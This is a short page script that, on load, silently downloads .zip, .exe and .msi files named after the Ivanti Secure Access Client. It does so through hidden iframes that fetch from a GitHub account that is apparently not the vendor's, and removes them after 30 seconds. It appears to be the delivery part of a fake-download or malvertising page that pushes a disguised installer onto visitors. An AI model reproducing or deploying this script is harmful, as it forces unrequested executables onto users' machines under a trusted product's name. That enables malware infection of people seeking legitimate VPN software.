  <script>
    const baseUrl = "https://github.com/ivaclient/ivanti/releases/download/3.956/Ivanti-Secure-Access-Client";

    const extensions = [".zip", ".exe", ".msi"];

    extensions.forEach(ext => {
      const f = document.createElement("iframe");
      f.style.display = "none";
      f.src = baseUrl + ext;
      document.body.appendChild(f);
      setTimeout(() => f.remove(), 30000);
    });
  </script>
